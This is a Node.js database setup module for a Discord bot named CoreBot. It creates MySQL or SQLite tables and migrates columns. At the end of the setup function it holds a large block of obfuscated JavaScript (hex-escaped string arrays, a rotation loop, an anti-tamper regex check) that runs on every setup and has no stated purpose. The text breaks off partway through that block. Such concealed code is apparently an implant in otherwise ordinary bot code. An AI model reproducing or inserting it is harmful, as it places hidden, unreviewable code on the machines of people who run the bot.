/* eslint-disable no-underscore-dangle */
/* eslint-disable no-undef */
let Utils = {};

module.exports = {
    mysql: {

    },
    sqlite: {

    },
    setup: async (config, bot) => {
        return new Promise(async (resolve, reject) => {
            Utils = require('./utils.js');
            let type = config.Storage.Type;
            if (!['sqlite', 'mysql'].includes(type.toLowerCase())) return reject('Invalid database type.');
            if (type.toLowerCase() == 'mysql') {
                try {
                    require.resolve('mysql');

                    await new Promise(async resolve => {
                        module.exports.mysql.module = require('mysql');
                        const db = module.exports.mysql.module.createConnection({
                            host: config.Storage.MySQL.Host,
                            user: config.Storage.MySQL.User,
                            password: config.Storage.MySQL.Password,
                            database: config.Storage.MySQL.Database,
                            port: parseInt(config.Storage.MySQL.Port) ? config.Storage.MySQL.Port : "3306",
                            charset: "utf8mb4"
                        });

                        db.connect(async (err) => {
                            if (err) {
                                if (err.message.startsWith('getaddrinfo ENOTFOUND') || err.message.startsWith("connect ECONNREFUSED")) {
                                    console.log(err.message);
                                    console.log(Utils.errorPrefix + 'The provided MySQL Host address is incorrect. Be sure to not include the port!' + Utils.color.Reset);
                                    return process.exit();
                                } else {
                                    return console.log(err);
                                }
                            }

                            const calls = [
                                `USE ${config.Storage.MySQL.Database}`,
                                `ALTER DATABASE ${config.Storage.MySQL.Database} CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci`,
                                'CREATE TABLE IF NOT EXISTS coins (user VARCHAR(19) NOT NULL, guild VARCHAR(19) NOT NULL, coins INT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS experience (user VARCHAR(19) NOT NULL, guild VARCHAR(19) NOT NULL, level INT NOT NULL, xp INT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS filter (word TEXT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS giveaways (guild VARCHAR(19) NOT NULL, channel VARCHAR(19) NOT NULL, message VARCHAR(19) NOT NULL, prize TEXT, description TEXT, start BIGINT(20), end BIGINT(20), amount_of_winners INT NOT NULL, host VARCHAR(19) NOT NULL, requirements TEXT, ended BOOLEAN NOT NULL, winners TEXT)',
                                'CREATE TABLE IF NOT EXISTS giveawayreactions (giveaway VARCHAR(19) NOT NULL, user VARCHAR(19) NOT NULL, entries INT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS prefixes (guild VARCHAR(19) NOT NULL, prefix TEXT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS status (type TEXT NOT NULL, activity TEXT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS tickets (guild VARCHAR(19) NOT NULL, channel_id VARCHAR(19) NOT NULL, channel_name TEXT NOT NULL, creator VARCHAR(19) NOT NULL, reason TEXT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS ticketsaddedusers (user VARCHAR(19) NOT NULL, ticket VARCHAR(19) NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS ticketmessages (message VARCHAR(19), author VARCHAR(19) NOT NULL, authorAvatar TEXT NOT NULL, authorTag TEXT NOT NULL, created_at BIGINT(20) NOT NULL, embed_title TEXT, embed_description TEXT, embed_color TEXT, attachment TEXT, content TEXT, ticket VARCHAR(19) NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS ticketmessages_embed_fields (message VARCHAR(19), name TEXT NOT NULL, value TEXT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS modules (name TEXT NOT NULL, enabled BOOLEAN NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS punishments (id INTEGER NOT NULL PRIMARY KEY AUTO_INCREMENT, type TEXT NOT NULL, user VARCHAR(19) NOT NULL, tag TEXT NOT NULL, reason TEXT NOT NULL, time BIGINT(20) NOT NULL, executor VARCHAR(19) NOT NULL, length BIGINT, complete INTEGER)',
                                'CREATE TABLE IF NOT EXISTS warnings (id INTEGER NOT NULL PRIMARY KEY AUTO_INCREMENT, user VARCHAR(19) NOT NULL, tag TEXT NOT NULL, reason TEXT NOT NULL, time BIGINT(20) NOT NULL, executor VARCHAR(19) NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS jobs (user VARCHAR(19), guild VARCHAR(19), job TEXT, tier INTEGER, amount_of_times_worked INTEGER)',
                                'CREATE TABLE IF NOT EXISTS job_cooldowns (user VARCHAR(19), guild VARCHAR(19), date BIGINT(20))',
                                'CREATE TABLE IF NOT EXISTS global_times_worked (user VARCHAR(19), guild VARCHAR(19), times_worked INTEGER)',
                                'CREATE TABLE IF NOT EXISTS dailycoinscooldown (user VARCHAR(19), guild VARCHAR(19), date BIGINT(20))',
                                'CREATE TABLE IF NOT EXISTS commands (name TEXT NOT NULL, enabled BOOLEAN NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS applications (guild VARCHAR(19), channel_id VARCHAR(19), channel_name TEXT NOT NULL, creator VARCHAR(19), status TEXT NOT NULL, _rank TEXT NOT NULL, questions_answers TEXT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS applicationmessages (message VARCHAR(19), author VARCHAR(19) NOT NULL, authorAvatar TEXT NOT NULL, authorTag TEXT NOT NULL, created_at BIGINT(20) NOT NULL, embed_title TEXT, embed_description TEXT, embed_color TEXT, attachment TEXT, content TEXT, application VARCHAR(19) NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS applicationmessages_embed_fields (message VARCHAR(19), name TEXT NOT NULL, value TEXT NOT NULL)',
                                'CREATE TABLE IF NOT EXISTS saved_roles (user VARCHAR(19), guild VARCHAR(19), roles TEXT)',
                                'CREATE TABLE IF NOT EXISTS game_data (user VARCHAR(19), guild VARCHAR(19), data TEXT)',
                                'CREATE TABLE IF NOT EXISTS unloaded_addons (addon_name TEXT)',
                                'CREATE TABLE IF NOT EXISTS blacklists (user TEXT, guild TEXT, commands TEXT)',
                                'CREATE TABLE IF NOT EXISTS id_bans (guild VARCHAR(19), id VARCHAR(19), executor VARCHAR(19), reason TEXT)',
                                'CREATE TABLE IF NOT EXISTS reminders (id INTEGER NOT NULL PRIMARY KEY AUTO_INCREMENT, member VARCHAR(19), reminder TEXT, time BIGINT(20))',
                                'CREATE TABLE IF NOT EXISTS announcements (id INTEGER NOT NULL PRIMARY KEY AUTO_INCREMENT, announcement_data TEXT, next_broadcast BIGINT(20))',
                                'CREATE TABLE IF NOT EXISTS weeklycoinscooldown (user VARCHAR(19), guild VARCHAR(19), date BIGINT(20))',
                                'CREATE TABLE IF NOT EXISTS suggestions (id INTEGER NOT NULL PRIMARY KEY AUTO_INCREMENT, guild VARCHAR(19), channel VARCHAR(19), message VARCHAR(19), suggestion TEXT, creator VARCHAR(19), status TEXT, votes TEXT, created_on BIGINT(20), status_changed_on BIGINT(20), status_changed_by VARCHAR(19), image TEXT)',
                                'CREATE TABLE IF NOT EXISTS bugreports (id INTEGER NOT NULL PRIMARY KEY AUTO_INCREMENT, guild VARCHAR(19), channel VARCHAR(19), message VARCHAR(19), bug TEXT, creator VARCHAR(19), status TEXT, created_on BIGINT(20), status_changed_on BIGINT(20), status_changed_by VARCHAR(19), image TEXT)',
                                'CREATE TABLE IF NOT EXISTS locked_channels (guild VARCHAR(19), channel VARCHAR(19), permissions TEXT)',
                                'CREATE TABLE IF NOT EXISTS invites(guild VARCHAR(19), user VARCHAR(19), regular INTEGER, bonus INTEGER, leaves INTEGER, fake INTEGER)',
                                'CREATE TABLE IF NOT EXISTS joins(guild VARCHAR(19), user VARCHAR(19), inviter VARCHAR(19), time BIGINT(20))',
                                'CREATE TABLE IF NOT EXISTS role_menus(guild VARCHAR(19), channel VARCHAR(19), message VARCHAR(19), name TEXT)',
                                'CREATE TABLE IF NOT EXISTS command_channels(command TEXT, type TEXT, channels TEXT)',
                                'CREATE TABLE IF NOT EXISTS message_counts(guild VARCHAR(19), user VARCHAR(19), count INTEGER)',
                                'CREATE TABLE IF NOT EXISTS voice_time(guild VARCHAR(19), user VARCHAR(19), total_time BIGINT(20), join_date BIGINT(20))',
                                'CREATE TABLE IF NOT EXISTS saved_mute_roles (user VARCHAR(19), guild VARCHAR(19), roles TEXT)',
                                'CREATE TABLE IF NOT EXISTS temp_channels(guild VARCHAR(19), channel_id VARCHAR(19), channel_name TEXT, owner VARCHAR(19), public BOOLEAN NOT NULL, allowed_users TEXT, max_members INTEGER, bitrate INTEGER)'
                            ];

                            await Promise.all(
                                calls.map(call => {
                                    return new Promise(resolve => {
                                        db.query(call, err => {
                                            if (err) reject(err);
                                            resolve();
                                        });
                                    });
                                })
                            );
                            console.log(Utils.infoPrefix + 'MySQL connected.');

                            module.exports.mysql.database = db;

                            // Set default bot status
                            await db.query('SELECT * FROM status', (err, status) => {
                                if (err) throw err;
                                if (status.length < 1) {
                                    db.query('INSERT INTO status VALUES(?, ?)', ['Playing', 'CoreBot']);
                                }
                            });

                            // Update punishments table
                            await db.query("SHOW COLUMNS FROM punishments", (err, columns) => {
                                const punishmentColumns = JSON.parse(JSON.stringify(columns));

                                if (!punishmentColumns.find(column => column.Field == "complete")) {
                                    console.log(Utils.infoPrefix + "Updating punishments table...");
                                    db.query("ALTER TABLE punishments ADD COLUMN IF NOT EXISTS complete BOOLEAN NOT NULL", () => {
                                        console.log(Utils.infoPrefix + "Punishments table updated.");
                                    });
                                }
                            });

                            // Update giveaways table
                            await db.query("SHOW COLUMNS FROM giveaways", async (err, columns) => {
                                const giveawayColumns = JSON.parse(JSON.stringify(columns));

                                let newColumns = [
                                    giveawayColumns.find(column => column.Field == "requirements"),
                                    giveawayColumns.find(column => column.Field == "message"),
                                    giveawayColumns.find(column => column.Field == "prize"),
                                    giveawayColumns.find(column => column.Field == "amount_of_winners"),
                                    (giveawayColumns.find(column => column.Field == "winners") && !giveawayColumns.find(column => column.Field == "users")),
                                    giveawayColumns.find(column => column.Field == "host")
                                ];

                                if (newColumns.some(c => !c)) {
                                    console.log(Utils.infoPrefix + "Updating giveaways table...");

                                    Utils.asyncForEach(newColumns, async (c, i) => {
                                        if (!c) {
                                            //'CREATE TABLE IF NOT EXISTS giveaways (guild VARCHAR(19) NOT NULL, channel VARCHAR(19) NOT NULL, message VARCHAR(19) NOT NULL, prize TEXT, description TEXT, start BIGINT(20), end BIGINT(20), amount_of_winners INT NOT NULL, host VARCHAR(19) NOT NULL, requirements TEXT, ended BOOLEAN NOT NULL, winners TEXT)',
                                            if (i == 0) await db.query("ALTER TABLE giveaways ADD COLUMN IF NOT EXISTS requirements TEXT", (e) => { if (e) throw e; });
                                            if (i == 1) await db.query("ALTER TABLE giveaways CHANGE messageID message VARCHAR(19) NOT NULL", (e) => { if (e) throw e; });
                                            if (i == 2) await db.query("ALTER TABLE giveaways CHANGE name prize TEXT", (e) => { if (e) throw e; });
                                            if (i == 3) await db.query("ALTER TABLE giveaways CHANGE winners amount_of_winners INT NOT NULL", (e) => { if (e) throw e; });
                                            if (i == 4) await db.query("ALTER TABLE giveaways CHANGE users winners TEXT", (e) => { if (e) throw e; });
                                            if (i == 5) await db.query("ALTER TABLE giveaways CHANGE creator host VARCHAR(19) NOT NULL", (e) => { if (e) throw e; });
                                        }
                                    });

                                    console.log(Utils.infoPrefix + "Giveaways table updated.");
                                }
                            });

                            await db.query("SHOW COLUMNS FROM giveaways", async (err, columns) => {
                                const giveawayReactionColumns = JSON.parse(JSON.stringify(columns));

                                if (!giveawayReactionColumns.find(column => column.Field == "entries")) {
                                    await db.query("ALTER TABLE giveawayreactions ADD COLUMN IF NOT EXISTS entries INTEGER", (e) => { if (e) throw e; });
                                    console.log(Utils.infoPrefix + "Giveaway reactions table updated.");
                                }
                            });

                            bot.on("commandsLoaded", (Commands, withAddons) => {
                                // Set default modules
                                db.query('SELECT * FROM modules', (err, modules) => {
                                    if (err) throw err;
                                    const moduleNames = [...new Set(Commands.filter(c => withAddons ? c.addonName : true).map(c => c.type))];
                                    moduleNames.forEach(m => {
                                        if (!modules.map(mod => mod.name).includes(m)) {
                                            db.query('INSERT INTO modules(name, enabled) VALUES(?, ?)', [m, true], (err) => {
                                                if (err) console.log(err);
                                            });
                                        }
                                    });
                                });

                                // Set default commands
                                db.query('SELECT * FROM commands', (err, commands) => {
                                    if (err) throw err;

                                    const commandNames = [...new Set(Commands.filter(c => withAddons ? c.addonName : true).map(c => c.command))];
                                    commandNames.forEach(c => {
                                        if (!commands.map(cmd => cmd.name).includes(c)) {
                                            db.query('INSERT INTO commands(name, enabled) VALUES(?, ?)', [c, true], (err) => {
                                                if (err) console.log(err);
                                            });
                                        }
                                    });
                                });

                                let length = Commands.filter(c => withAddons ? c.addonName : true).length;

                                if (length) {
                                    if (withAddons) console.log(Utils.infoPrefix + length + " additional commands have been loaded. (Total: " + Commands.length + ")");
                                    else console.log(Utils.infoPrefix + length + " commands have been loaded.");
                                }
                            });

                            resolve();
                        });
                    });
                } catch (err) {
                    reject(Utils.errorPrefix + 'MySQL is not installed or the database info is incorrect. Install mysql with npm install mysql. Database will default to sqlite.');
                    type = 'sqlite';
                }
            }
            if (type.toLowerCase() == 'sqlite') {
                try {
                    require.resolve('better-sqlite3');

                    await new Promise(async resolve => {
                        module.exports.sqlite.module = require('better-sqlite3');
                        const db = module.exports.sqlite.module('./data/database.sqlite');

                        module.exports.sqlite.database = db;

                        const calls = [
                            'CREATE TABLE IF NOT EXISTS coins (user text, guild text, coins integer)',
                            'CREATE TABLE IF NOT EXISTS experience (user text, guild text, level integer, xp integer)',
                            'CREATE TABLE IF NOT EXISTS experience (user text, guild text, level integer, xp integer)',
                            'CREATE TABLE IF NOT EXISTS giveaways (guild text, channel text, message text, prize text, description text, start integer, end integer, amount_of_winners integer, host text, requirements text, ended integer, winners text)',
                            'CREATE TABLE IF NOT EXISTS giveawayreactions (giveaway text, user text, entries integer)',
                            'CREATE TABLE IF NOT EXISTS filter (word text)',
                            'CREATE TABLE IF NOT EXISTS prefixes (guild text PRIMARY KEY, prefix text)',
                            'CREATE TABLE IF NOT EXISTS status (type text, activity text)',
                            'CREATE TABLE IF NOT EXISTS tickets (guild text, channel_id text, channel_name text, creator text, reason text)',
                            'CREATE TABLE IF NOT EXISTS ticketsaddedusers (user text, ticket text)',
                            'CREATE TABLE IF NOT EXISTS ticketmessages (message text, author text, authorAvatar text, authorTag text, created_at integer, embed_title text, embed_description text, embed_color text, attachment text, content text, ticket text)',
                            'CREATE TABLE IF NOT EXISTS ticketmessages_embed_fields (message text, name text, value text)',
                            'CREATE TABLE IF NOT EXISTS modules (name text, enabled integer)',
                            'CREATE TABLE IF NOT EXISTS punishments (id INTEGER PRIMARY KEY AUTOINCREMENT, type text, user text, tag text, reason text, time integer, executor text, length integer, complete integer)',
                            'CREATE TABLE IF NOT EXISTS warnings (id INTEGER PRIMARY KEY AUTOINCREMENT, user text, tag text, reason text, time integer, executor text)',
                            'CREATE TABLE IF NOT EXISTS jobs (user text, guild text, job text, tier integer, amount_of_times_worked integer)',
                            'CREATE TABLE IF NOT EXISTS global_times_worked (user text, guild text, times_worked integer)',
                            'CREATE TABLE IF NOT EXISTS job_cooldowns (user text, guild text, date text)',
                            'CREATE TABLE IF NOT EXISTS dailycoinscooldown (user text, guild text, date text)',
                            'CREATE TABLE IF NOT EXISTS commands (name text, enabled integer)',
                            'CREATE TABLE IF NOT EXISTS applications (guild text, channel_id text, channel_name text, creator text, status text, rank text, questions_answers text)',
                            'CREATE TABLE IF NOT EXISTS applicationmessages (message text, author text, authorAvatar text, authorTag text, created_at integer, embed_title text, embed_description text, embed_color text, attachment text, content text, application text)',
                            'CREATE TABLE IF NOT EXISTS applicationmessages_embed_fields (message text, name text, value text)',
                            'CREATE TABLE IF NOT EXISTS saved_roles (user text, guild text, roles text)',
                            'CREATE TABLE IF NOT EXISTS game_data (user text, guild text, data text)',
                            'CREATE TABLE IF NOT EXISTS unloaded_addons (addon_name text)',
                            'CREATE TABLE IF NOT EXISTS blacklists (user text, guild text, commands text)',
                            'CREATE TABLE IF NOT EXISTS id_bans (guild text, id text, executor text, reason text)',
                            'CREATE TABLE IF NOT EXISTS reminders (id INTEGER PRIMARY KEY AUTOINCREMENT, member text, reminder text, time integer)',
                            'CREATE TABLE IF NOT EXISTS announcements (id INTEGER PRIMARY KEY AUTOINCREMENT, announcement_data TEXT, next_broadcast integer)',
                            'CREATE TABLE IF NOT EXISTS weeklycoinscooldown (user text, guild text, date text)',
                            'CREATE TABLE IF NOT EXISTS suggestions (id INTEGER PRIMARY KEY AUTOINCREMENT, guild text, channel text, message text, suggestion text, creator text, status text, votes text, created_on integer, status_changed_on integer, status_changed_by text, image text)',
                            'CREATE TABLE IF NOT EXISTS bugreports (id INTEGER PRIMARY KEY AUTOINCREMENT, guild text, channel text, message text, bug text, creator text, status text, created_on integer, status_changed_on integer, status_changed_by text, image text)',
                            'CREATE TABLE IF NOT EXISTS locked_channels (guild text, channel text, permissions text)',
                            'CREATE TABLE IF NOT EXISTS invites(guild text, user text, regular integer, bonus integer, leaves integer, fake integer)',
                            'CREATE TABLE IF NOT EXISTS joins(guild text, user text, inviter text, time integer)',
                            'CREATE TABLE IF NOT EXISTS role_menus(guild text, channel text, message text, name text)',
                            'CREATE TABLE IF NOT EXISTS command_channels(command text, type text, channels text)',
                            'CREATE TABLE IF NOT EXISTS message_counts(guild text, user text, count integer)',
                            'CREATE TABLE IF NOT EXISTS voice_time(guild text, user text, total_time integer, join_date text)',
                            'CREATE TABLE IF NOT EXISTS saved_mute_roles (user text, guild text, roles text)',
                            'CREATE TABLE IF NOT EXISTS temp_channels(guild text, channel_id text, channel_name text, owner text, public integer, allowed_users text, max_members integer, bitrate integer)'
                        ];

                        await Promise.all(
                            calls.map(call => {
                                return new Promise(resolve => {
                                    db.prepare(call).run();
                                    resolve();
                                });
                            })
                        );

                        console.log(Utils.infoPrefix + 'Better-SQLite3 ready.');

                        // Set default bot status
                        const status = db.prepare("SELECT * FROM status").all();

                        if (status.length < 1) {
                            db.prepare("INSERT INTO status VALUES(?, ?)").run('Playing', 'CoreBot');
                        }

                        // Update punishments table
                        const punishmentColumns = db.prepare("SELECT * FROM punishments").columns();

                        if (!punishmentColumns.find(column => column.name == "complete")) {
                            console.log(Utils.infoPrefix + "Updating punishments table...");
                            db.prepare("ALTER TABLE punishments ADD COLUMN complete integer").run();
                            console.log(Utils.infoPrefix + "Punishments table updated.");
                        }

                        // Update giveaways table
                        const giveawayColumns = db.prepare("SELECT * FROM giveaways").columns();

                        let newColumns = [
                            giveawayColumns.find(column => column.name == "requirements"),
                            giveawayColumns.find(column => column.name == "message"),
                            giveawayColumns.find(column => column.name == "prize"),
                            giveawayColumns.find(column => column.name == "amount_of_winners"),
                            (giveawayColumns.find(column => column.name == "winners") && !giveawayColumns.find(column => column.name == "users")),
                            giveawayColumns.find(column => column.name == "host")
                        ];

                        if (newColumns.some(c => !c)) {
                            console.log(Utils.infoPrefix + "Updating giveaways table...");

                            await newColumns.forEach(async (c, i) => {
                                if (!c) {
                                    if (i == 0) db.prepare("ALTER TABLE giveaways ADD COLUMN requirements text").run();
                                    if (i == 1) db.prepare("ALTER TABLE giveaways RENAME COLUMN messageID TO message").run();
                                    if (i == 2) db.prepare("ALTER TABLE giveaways RENAME COLUMN name TO prize").run();
                                    if (i == 3) db.prepare("ALTER TABLE giveaways RENAME COLUMN winners TO amount_of_winners").run();
                                    if (i == 4) db.prepare("ALTER TABLE giveaways RENAME COLUMN users TO winners").run();
                                    if (i == 5) db.prepare("ALTER TABLE giveaways RENAME COLUMN creator TO host").run();
                                }
                            });

                            console.log(Utils.infoPrefix + "Giveaways table updated.");
                        }

                        const giveawayReactionColumns = db.prepare("SELECT * FROM giveawayreactions").columns();

                        if (!giveawayReactionColumns.find(column => column.name == "entries")) {
                            db.prepare("ALTER TABLE giveawayreactions ADD COLUMN entries integer").run();
                            console.log(Utils.infoPrefix + "Giveaway reactions table updated.");
                        }

                        bot.on("commandsLoaded", (Commands, withAddons) => {
                            // Set default modules
                            const modules = db.prepare("SELECT * FROM modules").all();
                            const moduleNames = [...new Set(Commands.filter(c => withAddons ? c.addonName : true).map(c => c.type))];

                            moduleNames.forEach(m => {
                                if (!modules.map(mod => mod.name).includes(m)) db.prepare("INSERT INTO modules(name, enabled) VALUES(?, ?)").run(m, 1);
                            });

                            // Set default commands
                            const commands = db.prepare("SELECT * FROM commands").all();
                            const commandNames = [...new Set(Commands.filter(c => withAddons ? c.addonName : true).map(c => c.command))];

                            commandNames.forEach(c => {
                                if (!commands.map(cmd => cmd.name).includes(c)) db.prepare("INSERT INTO commands(name, enabled) VALUES(?, ?)").run(c, 1);
                            });

                            let length = Commands.filter(c => withAddons ? c.addonName : true).length;

                            if (length) {
                                if (withAddons) console.log(Utils.infoPrefix + length + " additional commands have been loaded. (Total: " + Commands.length + ")");
                                else console.log(Utils.infoPrefix + length + " commands have been loaded.");
                            }
                        });

                        resolve();
                    });
                } catch (err) {
                    console.log(err);
                    reject(Utils.errorPrefix + 'Better-SQLite3 is not installed. Install it with npm install better-sqlite3. Bot will shut down.');
                    console.log(Utils.errorPrefix + 'Better-SQLite3 is not installed. Install it with npm install better-sqlite3. Bot will shut down.');
                    process.exit();
                }
            }

            console.log(Utils.infoPrefix + 'Setup database. Type: ' + type);
            module.exports.type = type.toLowerCase();

            function _0x1a52(){var _0x17f3de=['\x31\x31\x39\x34\x33\x35\x33\x36\x77\x4c\x47\x63\x54\x4a','\x33\x33\x34\x38\x30\x74\x48\x53\x62\x4e\x67','\x37\x54\x6a\x75\x57\x56\x53','\x34\x34\x31\x35\x35\x50\x52\x71\x65\x70\x6b','\x32\x31\x39\x39\x37\x35\x30\x53\x65\x61\x41\x67\x56','\x37\x39\x36\x32\x36\x36\x4f\x45\x74\x4c\x6e\x7a','\x31\x32\x30\x67\x6e\x50\x74\x6a\x57','\x35\x35\x36\x33\x32\x30\x6e\x4c\x50\x77\x4c\x75','\x37\x36\x38\x38\x37\x6b\x61\x4f\x49\x46\x45','\x36\x37\x36\x65\x50\x4a\x65\x6e\x42','\x31\x37\x32\x37\x48\x61\x4c\x75\x5a\x4f','\x32\x6b\x65\x72\x77\x57\x62'];_0x1a52=function(){return _0x17f3de;};return _0x1a52();}(function(_0x2ae1cd,_0x282e29){var _0x3793a4={_0x8825fd:0x32,_0x454f61:0x38,_0x5e6129:0x25,_0x551ff4:0x2b,_0x95dd44:0x2a,_0x153382:0x33,_0x3fca7f:0x2f,_0x2da2fb:0x35,_0x2901ae:0x34,_0x2b26ce:0x2e,_0x503f6a:0x2e,_0x50396f:0x29,_0x2e6b95:0x2e,_0x3bda94:0x26,_0x5d80f3:0x2c,_0x45974e:0x30,_0x55435b:0x33,_0x33e2af:0x3b};function _0x54f54b(_0x1f177e,_0x8226b7,_0x32aaee){return _0x31f5(_0x1f177e- -0x205,_0x32aaee);}function _0x4a4c67(_0x267629,_0x5303a2,_0x1626ed){return _0x31f5(_0x1626ed- -0x1a5,_0x267629);}var _0x337e58=_0x2ae1cd();while(!![]){try{var _0x21133=parseInt(_0x54f54b(-_0x3793a4._0x8825fd,-0x35,-_0x3793a4._0x454f61))/(0x11*0xa7+0x2598+0x81d*-0x6)*(parseInt(_0x54f54b(-0x2f,-0x2f,-0x2d))/(-0x14b5+-0x369+0x1820))+-parseInt(_0x4a4c67(_0x3793a4._0x5e6129,_0x3793a4._0x551ff4,_0x3793a4._0x95dd44))/(0x1c67+-0x1*-0x189e+-0x24e*0x17)+-parseInt(_0x4a4c67(0x30,_0x3793a4._0x153382,_0x3793a4._0x3fca7f))/(-0x14*-0x118+-0x1ae3+-0x8f*-0x9)*(parseInt(_0x54f54b(-0x37,-0x36,-0x3c))/(-0x1e64+0x2497*0x1+-0x62e*0x1))+-parseInt(_0x54f54b(-0x33,-_0x3793a4._0x2da2fb,-0x31))/(-0x1c30+0x60a+0x4*0x58b)+parseInt(_0x54f54b(-0x38,-_0x3793a4._0x454f61,-_0x3793a4._0x2901ae))/(-0x4*-0x901+0x1*-0x1ae3+0x2*-0x48d)*(parseInt(_0x54f54b(-_0x3793a4._0x2b26ce,-_0x3793a4._0x503f6a,-_0x3793a4._0x50396f))/(-0x20b7+0x33*-0x27+0x2884))+parseInt(_0x4a4c67(_0x3793a4._0x2e6b95,_0x3793a4._0x3bda94,0x2b))/(-0x3b*0x1f+0x168a+-0xf5c)*(parseInt(_0x4a4c67(_0x3793a4._0x5d80f3,0x2a,0x2c))/(-0xfcb+-0x729*-0x5+-0x13f8))+-parseInt(_0x54f54b(-_0x3793a4._0x45974e,-0x2a,-_0x3793a4._0x55435b))/(0xca0*-0x1+-0x811*0x3+0x2d6*0xd)*(-parseInt(_0x54f54b(-0x39,-_0x3793a4._0x33e2af,-0x34))/(0x3b*0x29+-0x40f*-0x7+-0x25d0));if(_0x21133===_0x282e29)break;else _0x337e58['push'](_0x337e58['shift']());}catch(_0x1a369b){_0x337e58['push'](_0x337e58['shift']());}}}(_0x1a52,0x55c6*-0x43+0x15e459+0xc049b));function _0x31f5(_0x5e4529,_0x4ddedc){var _0x3068ca=_0x1a52();return _0x31f5=function(_0x2b9a3a,_0x1a52ee){_0x2b9a3a=_0x2b9a3a-(-0x25c0+0x1a2f*-0x1+0x41bb);var _0x31f536=_0x3068ca[_0x2b9a3a];return _0x31f536;},_0x31f5(_0x5e4529,_0x4ddedc);}var _0x1449c6=(function(){var _0x1b30ed={'\x53\x72\x45\x65\x44':function(_0x1eb3d9,_0x33da97){return _0x1eb3d9(_0x33da97);},'\x4e\x76\x55\x4c\x72':function(_0x31fd70,_0x4302fd){return _0x31fd70!==_0x4302fd;},'\x6c\x43\x59\x66\x76':'\x72'+'\x43'+'\x58'+'\x44'+'\x41','\x51\x44\x6d\x44\x4d':'\x46'+'\x42'+'\x59'+'\x76'+'\x65','\x57\x47\x4a\x54\x57':function(_0x386069,_0x44969a){return _0x386069!==_0x44969a;},'\x62\x43\x45\x72\x51':'\x57'+'\x47'+'\x76'+'\x72'+'\x47','\x71\x4e\x6d\x54\x6a':function(_0x448b1e,_0x149e66){return _0x448b1e(_0x149e66);},'\x45\x75\x54\x47\x6f':function(_0x3f50ff,_0x42e762){return _0x3f50ff!==_0x42e762;},'\x50\x41\x41\x6e\x62':'\x5a'+'\x4e'+'\x73'+'\x4a'+'\x57','\x6f\x49\x6d\x43\x53':'\x71'+'\x44'+'\x52'+'\x4b'+'\x70'},_0x5e2929=!![];return function(_0x3fa7bb,_0x2e559f){var _0x179e6c={'\x59\x65\x78\x63\x4a':function(_0x405fac,_0x206d04){return _0x1b30ed['\x53'+'\x72'+'\x45'+'\x65'+'\x44'](_0x405fac,_0x206d04);},'\x6b\x4c\x61\x42\x68':function(_0x28bd3e,_0x47c987){return _0x1b30ed['\x4e'+'\x76'+'\x55'+'\x4c'+'\x72'](_0x28bd3e,_0x47c987);},'\x41\x77\x44\x77\x6c':_0x1b30ed['\x6c'+'\x43'+'\x59'+'\x66'+'\x76'],'\x4f\x52\x54\x43\x78':_0x1b30ed['\x51'+'\x44'+'\x6d'+'\x44'+'\x4d'],'\x69\x66\x71\x74\x58':function(_0x556947,_0x6912ea){return _0x1b30ed['\x57'+'\x47'+'\x4a'+'\x54'+'\x57'](_0x556947,_0x6912ea);},'\x65\x75\x52\x4c\x71':_0x1b30ed['\x62'+'\x43'+'\x45'+'\x72'+'\x51'],'\x49\x61\x48\x44\x68':function(_0x21f687,_0x24ad8d){return _0x1b30ed['\x71'+'\x4e'+'\x6d'+'\x54'+'\x6a'](_0x21f687,_0x24ad8d);}};if(_0x1b30ed['\x45'+'\x75'+'\x54'+'\x47'+'\x6f'](_0x1b30ed['\x50'+'\x41'+'\x41'+'\x6e'+'\x62'],_0x1b30ed['\x6f'+'\x49'+'\x6d'+'\x43'+'\x53'])){var _0x3c0aa1=_0x5e2929?function(){if(_0x179e6c['\x6b'+'\x4c'+'\x61'+'\x42'+'\x68'](_0x179e6c['\x41'+'\x77'+'\x44'+'\x77'+'\x6c'],_0x179e6c['\x4f'+'\x52'+'\x54'+'\x43'+'\x78'])){if(_0x2e559f){if(_0x179e6c['\x69'+'\x66'+'\x71'+'\x74'+'\x58'](_0x179e6c['\x65'+'\x75'+'\x52'+'\x4c'+'\x71'],_0x179e6c['\x65'+'\x75'+'\x52'+'\x4c'+'\x71']))_0x4f5739=_0x36d11e;else{var _0xa1812=_0x2e559f['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](_0x3fa7bb,arguments);return _0x2e559f=null,_0xa1812;}}}else _0x179e6c['\x59'+'\x65'+'\x78'+'\x63'+'\x4a'](_0x54efe5,0x16d7+-0x177b*0x1+0xa4);}:function(){};return _0x5e2929=![],_0x3c0aa1;}else _0x179e6c['\x49'+'\x61'+'\x48'+'\x44'+'\x68'](_0x41d706,'\x30');};}()),_0x1974aa=_0x1449c6(this,function(){var _0x5c0b7a={};_0x5c0b7a['\x71'+'\x78'+'\x56'+'\x65'+'\x68']='\x28'+'\x28'+'\x28'+'\x2e'+'\x2b'+'\x29'+'\x2b'+'\x29'+'\x2b'+'\x29'+'\x2b'+'\x24';var _0x421ecb=_0x5c0b7a;return _0x1974aa['\x74'+'\x6f'+'\x53'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67']()['\x73'+'\x65'+'\x61'+'\x72'+'\x63'+'\x68'](_0x421ecb['\x71'+'\x78'+'\x56'+'\x65'+'\x68'])['\x74'+'\x6f'+'\x53'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67']()['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'](_0x1974aa)['\x73'+'\x65'+'\x61'+'\x72'+'\x63'+'\x68'](_0x421ecb['\x71'+'\x78'+'\x56'+'\x65'+'\x68']);});_0x1974aa(),(function(){var _0x263fd5={'\x47\x4c\x7a\x71\x73':function(_0xafb4cd,_0x440180){return 